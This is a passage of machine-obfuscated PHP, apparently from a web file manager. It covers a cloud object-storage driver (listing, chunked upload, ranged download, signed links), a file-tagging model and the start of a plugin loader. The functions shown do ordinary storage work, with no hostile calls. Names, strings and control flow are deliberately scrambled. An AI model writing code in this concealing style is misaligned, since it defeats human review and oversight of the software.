µÌæ£: while (!0) { check_abort(); $A†º‹ óßµ = $this->listObjs($dœ÷ÖåÜ«Ï, $E’À•¥¸ÓØ, $AÀˆŠš‘â…); if (!$A†º‹ óßµ) { return !1; } $E’À•¥¸ÓØ = isset($A†º‹ óßµ[$cŠˆ¼¥çåÈ[1348]]) ? $A†º‹ óßµ[$cŠˆ¼¥çåÈ[1348]] : $cŠˆ¼¥çåÈ[33]; $e¡ÛŒ¿³¡‡ = isset($A†º‹ óßµ[$cŠˆ¼¥çåÈ[1349]]) ? $A†º‹ óßµ[$cŠˆ¼¥çåÈ[1349]] : array(); if (empty($e¡ÛŒ¿³¡‡)) { break; } $AÃ¹Ä” = array_filter($e¡ÛŒ¿³¡‡, function ($FÌáÛ¯Ç‘£) { $eÆ›‚ï…– =& $_SERVER[«¾°Ã¤]; return $FÌáÛ¯Ç‘£[$eÆ›‚ï…–[29]] == $eÆ›‚ï…–[77]; }); $C„Ã¼”ëµ¤ = count($e¡ÛŒ¿³¡‡); $AÃ¹Ä” = count($AÃ¹Ä”); $d¨³ÂùÙƒ = $C„Ã¼”ëµ¤ - $AÃ¹Ä”; if ($DÅŸøæç—¾) { $Aö‹…ŒËÀ += $AÃ¹Ä”; $cæŸã½îŞ += $d¨³ÂùÙƒ; if ($C„Ã¼”ëµ¤ < $AÀˆŠš‘â…) { break; } continue; } if ($C…†¬ˆ ½‹) { if ($d¨³ÂùÙƒ) { return !0; } } else { if ($AÃ¹Ä”) { return !0; } } if ($C„Ã¼”ëµ¤ < $AÀˆŠš‘â…) { break; } } if ($DÅŸøæç—¾) { return array($cŠˆ¼¥çåÈ[203] => $cæŸã½îŞ, $cŠˆ¼¥çåÈ[204] => $Aö‹…ŒËÀ); } return !1; goto dñë¢‹; dñë¢‹: } public function listAll($c™ëÎƒÃ´£) { goto Bò ¹äË§Î; A¨ÓïÜÚ¾µ: return $this->listAllFiles($c™ëÎƒÃ´£, array_keys($AÚ’­ÏÆ—£), $AÚ’­ÏÆ—£); goto F¡ÌÀ÷‚²®; Bò ¹äË§Î: $Dò¦‰ÍÒ„º =& $_SERVER[«¾°Ã¤]; $bæÇÜ›œ–î = $e«˜£»Ôƒ = array(); $this->fileList($c™ëÎƒÃ´£, $bæÇÜ›œ–î, $e«˜£»Ôƒ, !0); goto eÀ·­å·‘; eÀ·­å·‘: $AÚ’­ÏÆ—£ = array(); foreach ($e«˜£»Ôƒ as $f®¹‚ÍŸ¸) { $AÚ’­ÏÆ—£[$f®¹‚ÍŸ¸[$Dò¦‰ÍÒ„º[28]]] = $f®¹‚ÍŸ¸[$Dò¦‰ÍÒ„º[78]]; } foreach ($bæÇÜ›œ–î as $f®¹‚ÍŸ¸) { if (is_string($f®¹‚ÍŸ¸)) { $AÚ’­ÏÆ—£[$f®¹‚ÍŸ¸] = 0; } } goto A¨ÓïÜÚ¾µ; F¡ÌÀ÷‚²®: } public function canRead($DÑí†ø¿˜Ÿ) { return $this->exist($DÑí†ø¿˜Ÿ) ? !0 : !1; } public function canWrite($cä¾¢‚Œ£¦) { return $this->exist($cä¾¢‚Œ£¦) ? !0 : !1; } public function getContent($AĞí·ğ’Š¬) { return $this->fileSubstr($AĞí·ğ’Š¬, 0, -1); } public function setContent($Fí¼¼¹‘é‰, $Cñ‘ï¡“õ = '') { $Cöê¥±¤Ø =& $_SERVER[«¾°Ã¤]; if (!$Cñ‘ï¡“õ) { $e†É»†¾ï‚ = $this->ussRequest($Fí¼¼¹‘é‰, $Cöê¥±¤Ø[224]); return $e†É»†¾ï‚[$Cöê¥±¤Ø[1087]]; } $E„Š‰ƒÑµÙ = $this->tempFile($this->pathThis($Fí¼¼¹‘é‰)); file_put_contents($E„Š‰ƒÑµÙ, $Cñ‘ï¡“õ); if ($this->upload($Fí¼¼¹‘é‰, $E„Š‰ƒÑµÙ)) { $this->tempFileRemve($E„Š‰ƒÑµÙ); return !0; } return !1; } public function fileSubstr($eÀ³Ø®“Î†, $EÄ‰ôçç, $b¿ÚÉ«ñóÚ) { $aØªÛò¶œã =& $_SERVER[«¾°Ã¤]; if (!($eŠ„ÉÁğ¯Š = $this->link($eÀ³Ø®“Î†))) { return !1; } $aêÚêŠ‘½ = !1; if ($b¿ÚÉ«ñóÚ > 0) { $Añ—Ê×Ä‚ = $EÄ‰ôçç + $b¿ÚÉ«ñóÚ - 1; $aêÚêŠ‘½ = array($aØªÛò¶œã[1310] . $EÄ‰ôçç . $aØªÛò¶œã[449] . $Añ—Ê×Ä‚); } $A¯¢„’Â¯ = url_request($eŠ„ÉÁğ¯Š, $aØªÛò¶œã[228], !1, $aêÚêŠ‘½); return $A¯¢„’Â¯[$aØªÛò¶œã[719]] ? $A¯¢„’Â¯[$aØªÛò¶œã[1089]] : !1; } public function upload($fÍ®¼Ìí‘İ, $FŠ¾˜¥õ¡ù, $e –¬ù„ù = false, $fì¸¦Ğ¸ = REPEAT_REPLACE) { goto C«ÙåÙÊ“æ; däÖ¤ˆƒã¨: $b®ª“ â°ä = $this->ussRequest($fÍ®¼Ìí‘İ, $e“ÔëºÃçÍ[226], !1, $DñƒÔ†’´Ô); return $b®ª“ â°ä[$e“ÔëºÃçÍ[1087]] ? $this->getPathOuter($EêÎÀ±¶ç) : !1; goto ašÁ³÷µŒæ; döùß­°Í–: if (!$b®ª“ â°ä[$e“ÔëºÃçÍ[1087]]) { return !1; } $e¿Û É¦¸¹ = $b®ª“ â°ä[$e“ÔëºÃçÍ[1089]]; $A«’¯ã°Ã° = 0; goto A¯ŸŠ½àĞ‰; CÎÇÅöÒ¶«: do { $BªŒšà×“Ô = $e¿Û É¦¸¹[$e“ÔëºÃçÍ[1357]]; fseek_64($a™Àƒè‹ˆ¨, $A«’¯ã°Ã°); $c•õÄ×Êì‹ = fread($a™Àƒè‹ˆ¨, $BªŒšà×“Ô); $d•ªÒªÄ = 0; do { $d•ªÒªÄ++; $e¿Û É¦¸¹ = $this->uploadPart($fÍ®¼Ìí‘İ, $e¿Û É¦¸¹, $c•õÄ×Êì‹); } while (!$e¿Û É¦¸¹ && $d•ªÒªÄ < 3); if (!$e¿Û É¦¸¹) { return !1; } $AÇ½Öš°§ = $e¿Û É¦¸¹[$e“ÔëºÃçÍ[1356]]; $A«’¯ã°Ã° += $BªŒšà×“Ô; } while ($AÇ½Öš°§ != -1); fclose($a™Àƒè‹ˆ¨); $DñƒÔ†’´Ô = array($e“ÔëºÃçÍ[1358], $e“ÔëºÃçÍ[1359] . $e¿Û É¦¸¹[$e“ÔëºÃçÍ[1360]], $e“ÔëºÃçÍ[1354]); goto däÖ¤ˆƒã¨; C«ÙåÙÊ“æ: $e“ÔëºÃçÍ =& $_SERVER[«¾°Ã¤]; $DÄ”›ßœÑ‰ = IO::size($FŠ¾˜¥õ¡ù); if ($DÄ”›ßœÑ‰ <= 1024 * 1024 * 200) { $bæ»Å¼…–î = array($e“ÔëºÃçÍ[1351] . $FŠ¾˜¥õ¡ù); $b®ª“ â°ä = $this->ussRequest($fÍ®¼Ìí‘İ, $e“ÔëºÃçÍ[226], $bæ»Å¼…–î); return $b®ª“ â°ä[$e“ÔëºÃçÍ[1087]] ? $this->getPathOuter($fÍ®¼Ìí‘İ) : !1; } goto F·¢ì¸Å; A¯ŸŠ½àĞ‰: $AÇ½Öš°§ = $e¿Û É¦¸¹[$e“ÔëºÃçÍ[1356]]; $a™Àƒè‹ˆ¨ = fopen($FŠ¾˜¥õ¡ù, $e“ÔëºÃçÍ[1260]); if (!$a™Àƒè‹ˆ¨) { return !1; } goto CÎÇÅöÒ¶«; F·¢ì¸Å: $A‚‘ìˆŸîÚ = 1024 * 1024 * 10; $DñƒÔ†’´Ô = array($e“ÔëºÃçÍ[1352], $e“ÔëºÃçÍ[1353] . $DÄ”›ßœÑ‰, $e“ÔëºÃçÍ[1354], $e“ÔëºÃçÍ[1355] . $A‚‘ìˆŸîÚ); $b®ª“ â°ä = $this->ussRequest($fÍ®¼Ìí‘İ, $e“ÔëºÃçÍ[226], !1, $DñƒÔ†’´Ô); goto döùß­°Í–; ašÁ³÷µŒæ: } private function uploadPart($eã–Î¾Ç˜æ, $A°ˆİ¬á›², &$b´İßğŞèç) { $dºÎ²Ô÷§¼ =& $_SERVER[«¾°Ã¤]; $Cœ£ó”¹È = array($dºÎ²Ô÷§¼[1361], $dºÎ²Ô÷§¼[1359] . $A°ˆİ¬á›²[$dºÎ²Ô÷§¼[1360]], $dºÎ²Ô÷§¼[1362] . $A°ˆİ¬á›²[$dºÎ²Ô÷§¼[1356]], $dºÎ²Ô÷§¼[141] . $A°ˆİ¬á›²[$dºÎ²Ô÷§¼[1357]]); $B¹³µ”ˆ¢ = $this->ussRequest($eã–Î¾Ç˜æ, $dºÎ²Ô÷§¼[226], $b´İßğŞèç, $Cœ£ó”¹È); return !$B¹³µ”ˆ¢[$dºÎ²Ô÷§¼[1087]] ? $B¹³µ”ˆ¢[$dºÎ²Ô÷§¼[1087]] : $B¹³µ”ˆ¢[$dºÎ²Ô÷§¼[1089]]; } public function uploadFormData($aõÛ„ƒ¦ê, $f…É–…ÇÁ˜ = 3600) { return $this->uploadPolicy($aõÛ„ƒ¦ê, $f…É–…ÇÁ˜); } public function multiUploadFormData($D“ô÷‰ãé, $f·Œ­˜Ö»ì = 3600) { $fè¨¡‘¡ˆÆ =& $_SERVER[«¾°Ã¤]; $eè‘¢­Ğ–Ì = (int) $GLOBALS[$fè¨¡‘¡ˆÆ[7]][$fè¨¡‘¡ˆÆ[78]]; return $this->uploadPolicy($D“ô÷‰ãé, $f·Œ­˜Ö»ì, $eè‘¢­Ğ–Ì); } private function uploadPolicy($A†ã¦ÖáóÅ, $c¹‚“×áÒÃ = 3600, $a™–áê“Ø‘ = 0) { goto A†ø‡µÓç; b¢ğ®Ú–Ğ®: $e‘øÎ£ÌÄê = base64_encode(hash_hmac($B´ÔØé„“[1333], "\x50\x4f\123\124\x26{$b¤ô¾éíô}\46{$c˜ëÜÎÓ¤}\46{$cõ°åï‹Ê}", md5("{$this->userpass}"), !0)); $Céä¬ôÜÌÑ = array($B´ÔØé„“[1202] => $cõ°åï‹Ê, $B´ÔØé„“[1367] => "\125\120\131\125\x4e\40{$this->username}\72{$e‘øÎ£ÌÄê}", $B´ÔØé„“[175] => $this->endpoint . $b¤ô¾éíô); return $Céä¬ôÜÌÑ; goto dÎóÙ«çùò; A†ø‡µÓç: $B´ÔØé„“ =& $_SERVER[«¾°Ã¤]; $b¤ô¾éíô = $B´ÔØé„“[8] . $this->bucket; $c˜ëÜÎÓ¤ = gmdate($B´ÔØé„“[1297]); goto d­Ô¢çÔ»ô; d­Ô¢çÔ»ô: $CİÂÀí‚± = array($B´ÔØé„“[1363] => $this->bucket, $B´ÔØé„“[1364] => $A†ã¦ÖáóÅ, $B´ÔØé„“[1365] => time() + $c¹‚“×áÒÃ, $B´ÔØé„“[1366] => $c˜ëÜÎÓ¤); if ($a™–áê“Ø‘) { $CİÂÀí‚±[$B´ÔØé„“[1276]] = $a™–áê“Ø‘; } $cõ°åï‹Ê = base64_encode(json_encode($CİÂÀí‚±)); goto b¢ğ®Ú–Ğ®; dÎóÙ«çùò: } public function download($a…Õè§‚‰Ÿ, $dÙ¥å”ëç) { goto C¨˜«ìí; d²¸«¥‡¤Ñ: $aº”²éÆô¸ = 1024 * 200; $D„èÄÑŠ¦ = fopen($dÓ®†“áõà, $_SERVER[«¾°Ã¤][1316]); while (!0) { $BØƒœÏ£µİ = $this->fileSubstr($a…Õè§‚‰Ÿ, $d¡Ç¼ª˜‰¿, $aº”²éÆô¸); if ($BØƒœÏ£µİ === !1) { return !1; } fwrite($D„èÄÑŠ¦, $BØƒœÏ£µİ); $d¡Ç¼ª˜‰¿ += $aº”²éÆô¸; if (strlen($BØƒœÏ£µİ) < $aº”²éÆô¸) { break; } } goto CÆ²çÌÛ‡¥; C¨˜«ìí: $dÓ®†“áõà = IO::getPathInner(IO::mkfile($dÙ¥å”ëç)); if (!($Bƒ¾ïéò˜ = $this->link($a…Õè§‚‰Ÿ))) { return !1; } $d¡Ç¼ª˜‰¿ = 0; goto d²¸«¥‡¤Ñ; CÆ²çÌÛ‡¥: fclose($D„èÄÑŠ¦); return $dÙ¥å”ëç; goto EÔ¼â‰éí; EÔ¼â‰éí: } public function link($c¼İœã¢‹Ô, $dä©ŒÊàó = array()) { $A£ò—á„” =& $_SERVER[«¾°Ã¤]; $c¼İœã¢‹Ô = trim($c¼İœã¢‹Ô, $A£ò—á„”[8]); if (!empty($this->token)) { $dÛºœºĞ¯ = strtotime(date($A£ò—á„”[1368])); $Aãò°êó”Œ = substr(md5($this->token . $A£ò—á„”[282] . $dÛºœºĞ¯ . $A£ò—á„”[1369] . $c¼İœã¢‹Ô), 12, 8) . $dÛºœºĞ¯; $dä©ŒÊàó[] = $A£ò—á„”[1370] . $Aãò°êó”Œ; } $DÀ›ÆŠ¡…¿ = !empty($dä©ŒÊàó) ? $A£ò—á„”[70] . implode($A£ò—á„”[282], $dä©ŒÊàó) : $A£ò—á„”[33]; return $this->getHost() . $A£ò—á„”[8] . $c¼İœã¢‹Ô . $DÀ›ÆŠ¡…¿; } public function fileOut($e–²ëè‡Î, $EÂˆÖš—£ = false, $Bß¨ĞÚŠê = false, $Bˆ«¶Çˆ£Ç = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($e–²ëè‡Î, $EÂˆÖš—£, $Bß¨ĞÚŠê, $Bˆ«¶Çˆ£Ç); } if (!$Bß¨ĞÚŠê) { $Bß¨ĞÚŠê = $this->pathThis($e–²ëè‡Î); } $bª¾ò®áŞ = $EÂˆÖš—£ ? array($_SERVER[«¾°Ã¤][1371] . rawurlencode($Bß¨ĞÚŠê)) : array(); $eÜèŒÁ–È = $this->link($e–²ëè‡Î, $bª¾ò®áŞ); $this->fileOutLink($eÜèŒÁ–È); } public function fileOutServer($D´ƒªÇ¥“Ã, $BÙ™¤Î®‡ = false, $Bİ÷â‹àî‘ = false, $eÚÆª®÷‡ = '') { parent::fileOut($D´ƒªÇ¥“Ã, $BÙ™¤Î®‡, $Bİ÷â‹àî‘, $eÚÆª®÷‡); } public function fileOutImage($BÌ…Úš”©, $ağŞĞöÜâğ = 250) { $C–àÔäî•¸ = $this->link($BÌ…Úš”© . $_SERVER[«¾°Ã¤][1372] . $ağŞĞöÜâğ); $this->fileOutLink($C–àÔäî•¸); } public function fileOutImageServer($f‘ÄÓ‰äí, $A÷Ğğ£ºµÁ = 250) { parent::fileOutImage($f‘ÄÓ‰äí, $A÷Ğğ£ºµÁ); } public function hashMd5($f­Ò‹Ôø) { $d™ğ¹˜—ã =& $_SERVER[«¾°Ã¤]; $aó×‘¤ãÅ½ = $this->_objectMeta($f­Ò‹Ôø); return isset($aó×‘¤ãÅ½[$d™ğ¹˜—ã[208]]) ? $aó×‘¤ãÅ½[$d™ğ¹˜—ã[208]] : !1; } public function size($Dô›Öèºµ) { $DÒƒ¨ãõĞ¿ = $this->objectMeta($Dô›Öèºµ); return $DÒƒ¨ãõĞ¿ ? $DÒƒ¨ãõĞ¿[$_SERVER[«¾°Ã¤][78]] : 0; } public function info($aƒ”°ä‚§ù) { if ($this->isFolder($aƒ”°ä‚§ù)) { return $this->folderInfo($aƒ”°ä‚§ù); } else { if ($this->isFile($aƒ”°ä‚§ù)) { return $this->fileInfo($aƒ”°ä‚§ù); } } return !1; } public function exist($fÁ‚·È¾› ) { return $this->isFile($fÁ‚·È¾› ) || $this->isFolder($fÁ‚·È¾› ); } public function isFile($D¥ãóî¤î•) { return !$this->isFolder($D¥ãóî¤î•) && $this->objectMeta($D¥ãóî¤î•); } public function isFolder($b†ˆ©„…ºˆ) { return $this->cacheMethod($_SERVER[«¾°Ã¤][199], $b†ˆ©„…ºˆ); } protected function objectMeta($AíáƒëÉ†) { return $this->cacheMethod($_SERVER[«¾°Ã¤][200], $AíáƒëÉ†); } protected function _objectMeta($CíŒßÑĞ÷¥) { goto E¾ ’Ú¦÷Ğ; f’œŠõ³ì†: $A¢¸²Îæùš = array($e…©ÖùÀ£•[29] => isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1374]]) ? $Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1374]] : null, $e…©ÖùÀ£•[78] => isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1375]]) ? $Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1375]] : null, $e…©ÖùÀ£•[208] => isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1376]]) ? $Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1376]] : null, $e…©ÖùÀ£•[1343] => isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1377]]) ? $Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1377]] : null); $A¢¸²Îæùš[$e…©ÖùÀ£•[1344]] = isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1378]]) ? strtotime($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1378]]) : $A¢¸²Îæùš[$e…©ÖùÀ£•[1343]]; return $A¢¸²Îæùš; goto b•­¸Â¥ë’; E¾ ’Ú¦÷Ğ: $e…©ÖùÀ£• =& $_SERVER[«¾°Ã¤]; if ($CíŒßÑĞ÷¥ == $e…©ÖùÀ£•[33] || $CíŒßÑĞ÷¥ == $e…©ÖùÀ£•[8]) { return array(); } $bÚòÆ¿‰İî = $this->ussRequest($CíŒßÑĞ÷¥, $e…©ÖùÀ£•[1373]); goto Bê†š¤Ô—ò; Bê†š¤Ô—ò: if (!$bÚòÆ¿‰İî[$e…©ÖùÀ£•[1087]]) { return null; } $Fà‰‘óÒ‡÷ = isset($bÚòÆ¿‰İî[$e…©ÖùÀ£•[1089]]) ? $bÚòÆ¿‰İî[$e…©ÖùÀ£•[1089]] : array(); if (!isset($Fà‰‘óÒ‡÷[$e…©ÖùÀ£•[1374]])) { return null; } goto f’œŠõ³ì†; b•­¸Â¥ë’: } protected function _isFolder($E‘…Ô¤©È”) { $fÒğ·À‹Ü =& $_SERVER[«¾°Ã¤]; if ($E‘…Ô¤©È” == $fÒğ·À‹Ü[33] || $E‘…Ô¤©È” == $fÒğ·À‹Ü[8]) { return !0; } $d×™¤ö¨¨ = $this->_objectMeta($E‘…Ô¤©È”); return isset($d×™¤ö¨¨[$fÒğ·À‹Ü[29]]) && $d×™¤ö¨¨[$fÒğ·À‹Ü[29]] == $fÒğ·À‹Ü[77] ? !0 : !1; } } goto A²èÄùÓšË; b¢÷í„öš: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($c‰îõİÆ÷) { $bàİ¹ƒˆ¡– =& $_SERVER[«¾°Ã¤]; return array($bàİ¹ƒˆ¡–[1793] => array($c‰îõİÆ÷[0], $bàİ¹ƒˆ¡–[1794]), $bàİ¹ƒˆ¡–[1795] => array($c‰îõİÆ÷[0], $bàİ¹ƒˆ¡–[1796])); } protected function get($DÛ’‰¦Ó) { $Fà¾Œå«¼ =& $_SERVER[«¾°Ã¤]; $b·‚Õ‘ÙÆÖ = Model($Fà¾Œå«¼[495])->metaGet($DÛ’‰¦Ó, $Fà¾Œå«¼[1797]); $e¢¥îÂŒÒ = json_decode($b·‚Õ‘ÙÆÖ, !0); return $e¢¥îÂŒÒ ? $e¢¥îÂŒÒ : array($Fà¾Œå«¼[1798] => $Fà¾Œå«¼[87], $Fà¾Œå«¼[367] => array()); } protected function set($BĞ¾Í¦Í¢“, $DšßÔÌŠî) { $a¢‘÷„„¿… =& $_SERVER[«¾°Ã¤]; $DšßÔÌŠî = $DšßÔÌŠî ? $DšßÔÌŠî : array($a¢‘÷„„¿…[1798] => $a¢‘÷„„¿…[87], $a¢‘÷„„¿…[367] => array()); Model($a¢‘÷„„¿…[495])->metaSet($BĞ¾Í¦Í¢“, $a¢‘÷„„¿…[1797], json_encode($DšßÔÌŠî)); return Model($a¢‘÷„„¿…[495])->metaSet($BĞ¾Í¦Í¢“, $a¢‘÷„„¿…[1797], json_encode($DšßÔÌŠî)); } protected function getByTagID($d³ÎïÁ©„—, $E…«¡‰è) { goto A‡×ñ‰«; A‡×ñ‰«: $a¾´ğ·Ø‹ù =& $_SERVER[«¾°Ã¤]; if (!$d³ÎïÁ©„— || !$E…«¡‰è) { return !1; } if (!Model($a¾´ğ·Ø‹ù[495])->getInfoSimple($d³ÎïÁ©„—)) { return !1; } goto B‰¿˜õŒê•; AËë››£“Ç: return is_array($b·ß¥øãç…) ? $b·ß¥øãç… : !1; goto E‚îÚ«Ší; B‰¿˜õŒê•: $BÁ¬ïƒ¤ğÊ = $this->get($d³ÎïÁ©„—); if (!$BÁ¬ïƒ¤ğÊ || !isset($BÁ¬ïƒ¤ğÊ[$a¾´ğ·Ø‹ù[367]])) { return !1; } $b·ß¥øãç… = array_find_by_field($BÁ¬ïƒ¤ğÊ[$a¾´ğ·Ø‹ù[367]], $a¾´ğ·Ø‹ù[393], $E…«¡‰è); goto AËë››£“Ç; E‚îÚ«Ší: } public function listSource($bí›È«Ö¥, $aÌê§·À²) { goto b´ÀäÒ–Ù‰; aÃË‰òÃÊé: $D¥ÍğÏœİÍ = Model($d„„Áß„ÁÓ[1207])->listSource($BÃ•¢“¶¡); if (!$D¥ÍğÏœİÍ || count($f¥„¸°³äë) == $D¥ÍğÏœİÍ[$d„„Áß„ÁÓ[364]][$d„„Áß„ÁÓ[365]]) { return $D¥ÍğÏœİÍ; } $FÌİ‡Ãğ˜Ç = array(); goto E±›Şƒ»×; EÚß¼‡ä”: $F õÈ»öç = array(); foreach ($d¿äóëñ¸ as $Eƒî¡ Ø) { $aõ…°Ş®¥• = $Eƒî¡ Ø[$d„„Áß„ÁÓ[76]]; if (!$aõ…°Ş®¥•) { continue; } if (!isset($F õÈ»öç[$aõ…°Ş®¥•])) { $F õÈ»öç[$aõ…°Ş®¥•] = array(); } $F õÈ»öç[$aõ…°Ş®¥•][] = $Eƒî¡ Ø[$d„„Áß„ÁÓ[428]]; } $f¥„¸°³äë = array(); goto EÌ¬È×·ÚÖ; b©‡àöã˜Ğ: foreach ($f¥„¸°³äë as $aõ…°Ş®¥•) { if (!in_array($aõ…°Ş®¥•, $F¥ñ³‹°Øğ)) { $FÌİ‡Ãğ˜Ç[] = $aõ…°Ş®¥•; } } if ($FÌİ‡Ãğ˜Ç) { $this->removeBySource($bí›È«Ö¥, $FÌİ‡Ãğ˜Ç); } return $D¥ÍğÏœİÍ; goto cçŒ×£ÜµÅ; EÌ¬È×·ÚÖ: foreach ($F õÈ»öç as $BÜº¸¾ç¥ => $A©ğ …¶‰) { $bÜˆÜî²‡ = !0; if (!$aÌê§·À²) { $f¥„¸°³äë[] = $BÜº¸¾ç¥; continue; } foreach ($aÌê§·À² as $b“›•à¡—) { if (!in_array($b“›•à¡—, $A©ğ …¶‰)) { $bÜˆÜî²‡ = !1; break; } } if ($bÜˆÜî²‡) { $f¥„¸°³äë[] = $BÜº¸¾ç¥; } } if (!$f¥„¸°³äë) { return array(); } $BÃ•¢“¶¡ = array($d„„Áß„ÁÓ[419] => array($d„„Áß„ÁÓ[420], $f¥„¸°³äë), $d„„Áß„ÁÓ[493] => $bí›È«Ö¥, $d„„Áß„ÁÓ[413] => SourceModel::TYPE_GROUP); goto aÃË‰òÃÊé; b´ÀäÒ–Ù‰: $d„„Áß„ÁÓ =& $_SERVER[«¾°Ã¤]; if ($aÌê§·À² && !is_array($aÌê§·À²)) { $aÌê§·À² = array($aÌê§·À²); } $d¿äóëñ¸ = $this->listData($bí›È«Ö¥); goto EÚß¼‡ä”; E±›Şƒ»×: $a×³­  = array_to_keyvalue($D¥ÍğÏœİÍ[$d„„Áß„ÁÓ[75]], $d„„Áß„ÁÓ[33], $d„„Áß„ÁÓ[404]); $dÚÚìöÅÜá = array_to_keyvalue($D¥ÍğÏœİÍ[$d„„Áß„ÁÓ[74]], $d„„Áß„ÁÓ[33], $d„„Áß„ÁÓ[404]); $F¥ñ³‹°Øğ = array_merge($dÚÚìöÅÜá, $a×³­ ); goto b©‡àöã˜Ğ; cçŒ×£ÜµÅ: } protected function listData($a‹èï÷×Éõ) { $F†âˆ±‡³° =& $_SERVER[«¾°Ã¤]; $d”Äç‹¬Ë = array($F†âˆ±‡³°[1521] => 0, $F†âˆ±‡³°[472] => array($F†âˆ±‡³°[1799], 0), $F†âˆ±‡³°[424] => $F†âˆ±‡³°[1800] . $a‹èï÷×Éõ); $bÓî‘˜Ê×İ = $F†âˆ±‡³°[1801]; $Fö‡ÓÌÒˆÙ = $this->field($bÓî‘˜Ê×İ)->where($d”Äç‹¬Ë)->order($F†âˆ±‡³°[1802])->select(); return $Fö‡ÓÌÒˆÙ ? $Fö‡ÓÌÒˆÙ : array(); } protected function addToTag($dÇ“—Â±àÏ, $Bé¤ìø½, $eÙº¦ˆø¹) { $aí±ëÂ‰’ =& $_SERVER[«¾°Ã¤]; if (!$this->getByTagID($dÇ“—Â±àÏ, $eÙº¦ˆø¹) || !$Bé¤ìø½) { return !1; } if (!Model($aí±ëÂ‰’[799])->pathInfo($Bé¤ìø½)) { return !1; } $d„™…ÇŒÖË = array($aí±ëÂ‰’[1521] => 0, $aí±ëÂ‰’[472] => $eÙº¦ˆø¹, $aí±ëÂ‰’[423] => $Bé¤ìø½, $aí±ëÂ‰’[424] => $aí±ëÂ‰’[1803] . $dÇ“—Â±àÏ, $aí±ëÂ‰’[422] => $aí±ëÂ‰’[33], $aí±ëÂ‰’[1697] => 0); if ($this->where($d„™…ÇŒÖË)->find()) { return !1; } return $this->add($d„™…ÇŒÖË); } protected function removeFromTag($A•ø¼†½ê—, $D•À‰Úè‘½, $EÛÇµß†º±) { $fó©Ë³ãÙ =& $_SERVER[«¾°Ã¤]; if (!$this->getByTagID($A•ø¼†½ê—, $EÛÇµß†º±) || !$D•À‰Úè‘½) { return !1; } if (is_array($D•À‰Úè‘½)) { $D•À‰Úè‘½ = array($fó©Ë³ãÙ[7], $D•À‰Úè‘½); } $bŒ‡ñ²š˜ = array($fó©Ë³ãÙ[1521] => 0, $fó©Ë³ãÙ[472] => $EÛÇµß†º±, $fó©Ë³ãÙ[424] => $fó©Ë³ãÙ[1803] . $A•ø¼†½ê—, $fó©Ë³ãÙ[423] => $D•À‰Úè‘½); return $this->where($bŒ‡ñ²š˜)->delete(); } protected function removeByTag($c¢¯âÒ‹ÎÂ, $BòÔà¼‰‘–) { $d¶«·–Ä =& $_SERVER[«¾°Ã¤]; if (!$this->getByTagID($c¢¯âÒ‹ÎÂ, $BòÔà¼‰‘–)) { return !1; } $e“—´œâÍ¬ = array($d¶«·–Ä[1521] => 0, $d¶«·–Ä[472] => $BòÔà¼‰‘–, $d¶«·–Ä[424] => $d¶«·–Ä[1803] . $c¢¯âÒ‹ÎÂ); return $this->where($e“—´œâÍ¬)->delete(); } protected function removeBySource($c¦œàâš«, $dªÎ¥°‘ò–) { $e™¯šÔ†Ê =& $_SERVER[«¾°Ã¤]; if (!$c¦œàâš« || !$dªÎ¥°‘ò–) { return !1; } if (is_array($dªÎ¥°‘ò–)) { $dªÎ¥°‘ò– = array($e™¯šÔ†Ê[7], $dªÎ¥°‘ò–); } $eóÚÀÍİò = array($e™¯šÔ†Ê[1521] => 0, $e™¯šÔ†Ê[423] => $dªÎ¥°‘ò–, $e™¯šÔ†Ê[472] => array($e™¯šÔ†Ê[972], 0), $e™¯šÔ†Ê[424] => $e™¯šÔ†Ê[1803] . $c¦œàâš«); return $this->where($eóÚÀÍİò)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x70\x6c\x75\x67\x69\x6e\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x73\x74\141\164\x75\163", "\x72\145\147\x69\145\x73\164", "\143\157\156\x66\151\147"); public function loadList($e–’†ÅÛ‹Ü = false) { $D¶ùÄÄ… = array_to_keyvalue($this->listData(), $_SERVER[«¾°Ã¤][28]); if ($e–’†ÅÛ‹Ü) { return $D¶ùÄÄ…[$e–’†ÅÛ‹Ü]; } return $D¶ùÄÄ…; } public function init() { $c¦‰»Š¨Íº =& $_SERVER[«¾°Ã¤]; Hook::trigger($c¦‰»Š¨Íº[1804]); $e¤×±ºÓà = $this->loadPluginList(); foreach ($e¤×±ºÓà as $DœéÎÜÃˆ => $FØÏ­í¸…) { $bé¯‰¾©ª = $this->appAllow($DœéÎÜÃˆ, $FØÏ­í¸…); if (!$bé¯‰¾©ª) { continue; } foreach ($FØÏ­í¸…[$c¦‰»Š¨Íº[1805]] as $cÎË„Œ‰ => $C£ğæê‚›) { Hook::bind($cÎË„Œ‰, $C£ğæê‚›); } } Hook::trigger($c¦‰»Š¨Íº[1806]); Hook::trigger(ACTION); } public function appAllow($c…òï¨Ú«İ, $A„³ë¡ŠĞë, $d±Ÿ™œëÎã = true) { $Cœª¦½µõ =& $_SERVER[«¾°Ã¤]; $b§†«„…æ¨ = PLUGIN_DIR . $c…òï¨Ú«İ . $Cœª¦½µõ[1807]; if (!is_array($A„³ë¡ŠĞë) || !is_array($A„³ë¡ŠĞë[$Cœª¦½µõ[1805]]) || $A„³ë¡ŠĞë[$Cœª¦½µõ[719]] != 1 || !is_file($b§†«„…æ¨)) { return !1; } if ($GLOBALS[$Cœª¦½µõ[494]] == 1) { return !0; } if ($d±Ÿ™œëÎã && !Action($Cœª¦½µõ[1808])->checkAuth($c…òï¨Ú«İ)) { return !1; } return !0; } public function unInstall($CåõÆº‡á¿) { $bª…˜À‹£‘ =& $_SERVER[«¾°Ã¤]; $b“ù¾¹™ñÔ = $this->loadList($CåõÆº‡á¿); if (file_exists(PLUGIN_DIR . $CåõÆº‡á¿)) { 